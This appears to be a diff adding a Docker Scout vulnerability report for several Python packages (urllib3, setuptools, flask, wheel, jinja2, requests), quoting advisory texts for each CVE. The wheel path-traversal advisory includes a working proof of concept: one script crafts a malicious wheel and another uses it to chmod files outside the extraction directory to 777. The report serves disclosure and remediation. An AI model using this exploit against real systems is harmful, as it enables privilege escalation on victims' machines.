+http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above
+http = urllib3.PoolManager(retries=False)  # should return the first response
+
+resp = http.request("GET", "https://httpbin.org/redirect/1")
+```
+
+However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.
+
+## Affected usages
+
+Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.
+
+By default, requests and botocore users are not affected.
+
+## Impact
+
+Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.
+
+## Remediation
+
+You can remediate this vulnerability with the following steps:
+
+ * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.
+ * Disable redirects at the `request()` level instead of the `PoolManager()` level.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-37891?s=github&n=urllib3&t=pypi&vr=%3C1.26.19"><img alt="medium 4.4: CVE--2024--37891" src="https://img.shields.io/badge/CVE--2024--37891-lightgrey?label=medium%204.4&labelColor=fbb552"/></a> <i>Incorrect Resource Transfer Between Spheres</i>
+
+<table>
+<tr><td>Affected range</td><td><code><1.26.19</code></td></tr>
+<tr><td>Fixed version</td><td><code>1.26.19</code></td></tr>
+<tr><td>CVSS Score</td><td><code>4.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.263%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.
+
+However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.
+
+Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.
+
+Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.
+
+## Affected usages
+
+We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:
+
+* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.
+* Not disabling HTTP redirects.
+* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.
+
+## Remediation
+
+* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.
+* Disabling HTTP redirects using `redirects=False` when sending requests.
+* Not using the `Proxy-Authorization` header.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 3" src="https://img.shields.io/badge/H-3-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>57.5.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/setuptools@57.5.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2022-40897?s=github&n=setuptools&t=pypi&vr=%3C65.5.1"><img alt="high 8.7: CVE--2022--40897" src="https://img.shields.io/badge/CVE--2022--40897-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>
+
+<table>
+<tr><td>Affected range</td><td><code><65.5.1</code></td></tr>
+<tr><td>Fixed version</td><td><code>65.5.1</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:L/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.527%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1"><img alt="high 7.7: CVE--2025--47273" src="https://img.shields.io/badge/CVE--2025--47273-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><78.1.1</code></td></tr>
+<tr><td>Fixed version</td><td><code>78.1.1</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.487%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>65th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Summary 
+A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1
+
+### Details
+```
+    def _download_url(self, url, tmpdir):
+        # Determine download filename
+        #
+        name, _fragment = egg_info_for_url(url)
+        if name:
+            while '..' in name:
+                name = name.replace('..', '.').replace('\\', '_')
+        else:
+            name = "__downloaded__"  # default if URL has no path contents
+
+        if name.endswith('.[egg.zip](http://egg.zip/)'):
+            name = name[:-4]  # strip the extra .zip before download
+
+ -->       filename = os.path.join(tmpdir, name)
+```
+
+Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88
+
+`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.
+`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.
+
+### Risk Assessment
+As easy_install and package_index are deprecated, the exploitation surface is reduced.
+However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.
+
+### Impact
+An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.
+
+### References
+https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5
+https://github.com/pypa/setuptools/issues/4946
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-6345?s=github&n=setuptools&t=pypi&vr=%3C70.0.0"><img alt="high 7.5: CVE--2024--6345" src="https://img.shields.io/badge/CVE--2024--6345-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Control of Generation of Code ('Code Injection')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><70.0.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>70.0.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>5.553%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>flask</strong> <code>2.0.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/flask@2.0.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-30861?s=github&n=flask&t=pypi&vr=%3C2.2.5"><img alt="high 8.7: CVE--2023--30861" src="https://img.shields.io/badge/CVE--2023--30861-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Use of Persistent Cookies Containing Sensitive Information</i>
+
+<table>
+<tr><td>Affected range</td><td><code><2.2.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.2.5</code></td></tr>
+<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.192%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session, and the proxy's behavior regarding cookies. The risk depends on _all_ these conditions being met.
+
+1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
+2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).
+2. The application does not access or modify the session at any point during a request.
+4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).
+5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
+
+This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2026-27205?s=github&n=flask&t=pypi&vr=%3C3.1.3"><img alt="low 2.3: CVE--2026--27205" src="https://img.shields.io/badge/CVE--2026--27205-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Use of Cache Containing Sensitive Information</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.
+
+The severity depends on the application's use of the session, and the cache's behavior regarding cookies. The risk depends on all these conditions being met.
+
+1. The application must be hosted behind a caching proxy that does not ignore responses with cookies.
+2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
+3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wheel</strong> <code>0.40.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/wheel@0.40.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1"><img alt="high 7.1: CVE--2026--24049" src="https://img.shields.io/badge/CVE--2026--24049-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=0.40.0<br/><=0.46.1</code></td></tr>
+<tr><td>Fixed version</td><td><code>0.46.2</code></td></tr>
+<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Summary
+ - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  
+ - **Root Cause Component:** wheel.cli.unpack.unpack function.  
+ - **Affected Packages:**  
+   1. wheel (Upstream source)  
+   2. setuptools (Downstream, vendors wheel)  
+ - **Severity:** High (Allows modifying system file permissions).  
+
+### Details  
+The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  
+```
+# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)
+for zinfo in wf.filelist:
+    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile
+
+    # (2) VULNERABILITY:
+    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.
+    # If zinfo.filename contains "../", this targets files outside the destination.
+    permissions = zinfo.external_attr >> 16 & 0o777
+    destination.joinpath(zinfo.filename).chmod(permissions)
+```  
+
+### PoC  
+I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  
+
+**Prerequisites:** pip install setuptools  
+
+**Step 1: Generate the Malicious Wheel (gen_poc.py)**  
+This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  
+```
+import zipfile
+import hashlib
+import base64
+import os
+
+def urlsafe_b64encode(data):
+    """
+    Helper function to encode data using URL-safe Base64 without padding.
+    Required by the Wheel file format specification.
+    """
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')
+
+def get_hash_and_size(data_bytes):
+    """
+    Calculates SHA-256 hash and size of the data.
+    These values are required to construct a valid 'RECORD' file,
+    which is used by the 'wheel' library to verify integrity.
+    """
+    digest = hashlib.sha256(data_bytes).digest()
+    hash_str = "sha256=" + urlsafe_b64encode(digest)
+    return hash_str, str(len(data_bytes))
+
+def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):
+    print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")
+
+    # 1. Prepare Standard Metadata Content
+    # These are minimal required contents to make the wheel look legitimate.
+    wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
+    metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"
+   
+    # 2. Define Malicious Payload (Path Traversal)
+    # The content doesn't matter, but the path does.
+    payload_content = b"PWNED by Path Traversal"
+
+    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'
+    # The vulnerability allows 'chmod' to affect this path directly.
+    malicious_path = "../../poc_target.txt"
+
+    # 3. Calculate Hashes for Integrity Check Bypass
+    # The 'wheel' library verifies if the file hash matches the RECORD entry.
+    # To bypass this check, we calculate the correct hash for our malicious file.
+    wheel_hash, wheel_size = get_hash_and_size(wheel_content)
+    metadata_hash, metadata_size = get_hash_and_size(metadata_content)
+    payload_hash, payload_size = get_hash_and_size(payload_content)
+
+    # 4. Construct the 'RECORD' File
+    # The RECORD file lists all files in the wheel with their hashes.
+    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.
+    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.
+    record_lines = [
+        f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",
+        f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",
+        f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path
+        "evil-1.0.dist-info/RECORD,,"
+    ]
+    record_content = "\n".join(record_lines).encode('utf-8')
+
+    # 5. Build the Zip File
+    with zipfile.ZipFile(filename, "w") as zf:
+        # Write standard metadata files
+        zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)
+        zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)
+        zf.writestr("evil-1.0.dist-info/RECORD", record_content)
+
+        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file
+        # We need to set specific permission bits to trigger the vulnerability.
+        zinfo = zipfile.ZipInfo(malicious_path)
+       
+        # Set external attributes to 0o777 (rwxrwxrwx)
+        # Upper 16 bits: File type (0o100000 = Regular File)
+        # Lower 16 bits: Permissions (0o777 = World Writable)
+        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.
+        zinfo.external_attr = (0o100000 | 0o777) << 16
+       
+        zf.writestr(zinfo, payload_content)
+
+    print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")
+
+if __name__ == "__main__":
+    create_evil_wheel_v4()
+```  
+
+**Step 2: Run the Exploit (exploit.py)**  
+```
+from pathlib import Path
+import sys
+
+# Demonstrating impact on setuptools
+try:
+    from setuptools._vendor.wheel.cli.unpack import unpack
+    print("[*] Loaded unpack from setuptools")
+except ImportError:
+    from wheel.cli.unpack import unpack
+    print("[*] Loaded unpack from wheel")
+
+# 1. Setup Target (Read-Only system file simulation)
+target = Path("poc_target.txt")
+target.write_text("SENSITIVE CONFIG")
+target.chmod(0o400) # Read-only
+print(f"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}")
+
+# 2. Run Vulnerable Unpack
+# The wheel contains "../../poc_target.txt".
+# unpack() will extract safely, BUT chmod() will hit the actual target file.
+try:
+    unpack("evil-1.0-py3-none-any.whl", "unpack_dest")
+except Exception as e:
+    print(f"[!] Ignored expected extraction error: {e}")
+
+# 3. Check Result
+final_perms = oct(target.stat().st_mode)[-3:]
+print(f"[*] Final Perms: {final_perms}")
+
+if final_perms == "777":
+    print("VULNERABILITY CONFIRMED: Target file is now world-writable (777)!")
+else:
+    print("[-] Attack failed.")
+```  
+
+**result:**  
+<img width="806" height="838" alt="image" src="https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db" />  
+  
+### Impact  
+Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  
+
+### Recommended Fix  
+The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  
+
+### Suggested Patch:  
+```
+# extract() returns the actual path where the file was written
+extracted_path = wf.extract(zinfo, destination)
+
+# Only apply chmod if a file was actually written
+if extracted_path:
+    permissions = zinfo.external_attr >> 16 & 0o777
+    Path(extracted_path).chmod(permissions)
+```
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>jinja2</strong> <code>3.0.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/jinja2@3.0.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2025-27516?s=github&n=jinja2&t=pypi&vr=%3C%3D3.1.5"><img alt="medium 5.4: CVE--2025--27516" src="https://img.shields.io/badge/CVE--2025--27516-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements Used in a Template Engine</i>
+
+<table>
+<tr><td>Affected range</td><td><code><=3.1.5</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.6</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.214%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.
+
+To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.
+
+Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-56326?s=github&n=jinja2&t=pypi&vr=%3C%3D3.1.4"><img alt="medium 5.4: CVE--2024--56326" src="https://img.shields.io/badge/CVE--2024--56326-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Protection Mechanism Failure</i>
+
+<table>
+<tr><td>Affected range</td><td><code><=3.1.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.336%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.
+
+To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.
+
+Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-56201?s=github&n=jinja2&t=pypi&vr=%3E%3D3.0.0%2C%3C%3D3.1.4"><img alt="medium 5.4: CVE--2024--56201" src="https://img.shields.io/badge/CVE--2024--56201-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Escape, Meta, or Control Sequences</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=3.0.0<br/><=3.1.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.5</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.459%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.
+
+To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-34064?s=github&n=jinja2&t=pypi&vr=%3C3.1.4"><img alt="medium 5.4: CVE--2024--34064" src="https://img.shields.io/badge/CVE--2024--34064-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.4</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.4</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>1.086%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>78th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.
+
+Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.
+
+</blockquote>
+</details>
+
+<a href="https://scout.docker.com/v/CVE-2024-22195?s=github&n=jinja2&t=pypi&vr=%3C3.1.3"><img alt="medium 5.4: CVE--2024--22195" src="https://img.shields.io/badge/CVE--2024--22195-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>
+
+<table>
+<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
+<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
+<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>0.151%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.
+
+</blockquote>
+</details>
+</details></td></tr>
+
+<tr><td valign="top">
+<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>requests</strong> <code>2.25.0</code> (pypi)</summary>
+
+<small><code>pkg:pypi/requests@2.25.0</code></small><br/>
+<a href="https://scout.docker.com/v/CVE-2023-32681?s=github&n=requests&t=pypi&vr=%3E%3D2.3.0%2C%3C2.31.0"><img alt="medium 6.1: CVE--2023--32681" src="https://img.shields.io/badge/CVE--2023--32681-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>
+
+<table>
+<tr><td>Affected range</td><td><code>>=2.3.0<br/><2.31.0</code></td></tr>
+<tr><td>Fixed version</td><td><code>2.31.0</code></td></tr>
+<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
+<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N</code></td></tr>
+<tr><td>EPSS Score</td><td><code>6.278%</code></td></tr>
+<tr><td>EPSS Percentile</td><td><code>91st percentile</code></td></tr>
+</table>
+
+<details><summary>Description</summary>
+<blockquote>
+
+### Impact
+
+Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).
+
+**Current vulnerable behavior(s):**
+
+1. HTTP → HTTPS: **leak**
+2. HTTPS → HTTP: **no leak**
+3. HTTPS → HTTPS: **leak**
+4. HTTP → HTTP: **no leak**
+
+For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.
+
